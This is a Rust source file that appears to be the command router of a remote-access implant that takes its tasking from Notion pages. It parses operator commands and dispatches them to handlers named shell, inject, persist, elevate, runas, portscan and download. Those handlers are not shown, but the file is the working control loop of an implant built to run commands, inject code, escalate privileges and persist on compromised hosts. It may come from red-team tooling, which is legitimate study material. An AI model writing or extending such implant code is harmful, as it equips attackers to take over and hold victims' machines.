// Standard Library Imports
use std::error::Error;
use std::result::Result;
use std::fmt;
// Local imports
use crate::config::ConfigOptions;
use crate::logger::Logger;
// Command modules
mod cd;
mod download;
pub mod elevate;
pub mod getprivs;
mod inject;
mod persist;
mod portscan;
mod ps;
mod pwd;
mod runas;
mod save;
pub mod shell;
mod sleep;
mod shutdown;
mod whoami;
mod unknown;

/// All the possible command types. Some have command strings, and some don't.
pub enum CommandType {
    Cd(String),
    Download(String),
    Elevate(String),
    Getprivs,
    Inject(String),
    Portscan(String),
    Persist(String),
    Ps,
    Pwd,
    Save(String),
    Runas(String),
    Shell(String),
    Shutdown,
    Sleep(String),
    Whoami,
    Unknown(String)
}

/// Simple errors for the construction of a NotionCommand.
/// Returned if construction fails.
#[derive(Debug)]
pub struct CommandError(String);

impl fmt::Display for CommandError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl Error for CommandError {}

/// The command itself, containing the `CommandType` enum
pub struct NotionCommand {
    pub command_type: CommandType,
}

impl NotionCommand {
    /// Constructor for `NotionCommands`. Takes the raw string from the `to_do`.
    pub fn from_string(command_str: String) -> Result<NotionCommand, CommandError> {
        let mut command_words = command_str.split(" ");
        // Taking the first command advances the iterator, so the remaining 
        // items should be the command data.
        // The call to this function clears the target emoji
        // TODO: Maybe do that here?
        if let Some(t) = command_words.nth(0) {
            let command_string = String::from(
                command_words.collect::<Vec<&str>>()
                .as_slice()
                .join::<&str>(" ")
            );
            let command_type: CommandType = match t {
                "cd"       => CommandType::Cd(command_string),
                "download" => CommandType::Download(command_string),
                "elevate"  => CommandType::Elevate(command_string),
                "getprivs" => CommandType::Getprivs,
                "inject"   => CommandType::Inject(command_string),
                "persist"  => CommandType::Persist(command_string),
                "portscan" => CommandType::Portscan(command_string),
                "ps"       => CommandType::Ps,
                "pwd"      => CommandType::Pwd,
                "runas"    => CommandType::Runas(command_string),
                "save"     => CommandType::Save(command_string),
                "shell"    => CommandType::Shell(command_string),
                "shutdown" => CommandType::Shutdown,
                "sleep"    => CommandType::Sleep(command_string),
                "whoami"   => CommandType::Whoami,
                _          => CommandType::Unknown(command_string),
            };
            return Ok(NotionCommand { command_type: command_type});

        } else {
            Err(CommandError("Could not parse command!".to_string()))
        }
    }
    /// Executes the appropriate function for the `command_type`. 
    pub async fn handle(&self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
        match &self.command_type {
            CommandType::Cd(s)       => cd::handle(&s),
            CommandType::Download(s) => download::handle(&s, logger).await,
            CommandType::Elevate(s)  => elevate::handle(&s, config_options).await,
            CommandType::Getprivs    => getprivs::handle().await,
            CommandType::Inject(s)   => inject::handle(&s, logger).await,
            CommandType::Persist(s)  => persist::handle(&s, config_options, logger).await,
            CommandType::Portscan(s) => portscan::handle(&s, logger).await,
            CommandType::Ps          => ps::handle().await,
            CommandType::Pwd         => pwd::handle().await,
            CommandType::Runas(s)    => runas::handle(&s).await,
            CommandType::Save(s)     => save::handle(&s, config_options).await,
            CommandType::Shell(s)    => shell::handle(&s).await,
            CommandType::Shutdown    => shutdown::handle().await,
            CommandType::Sleep(s)    => sleep::handle(&s, config_options).await,
            CommandType::Whoami      => whoami::handle().await,
            CommandType::Unknown(_)  => unknown::handle().await
        }
    }
}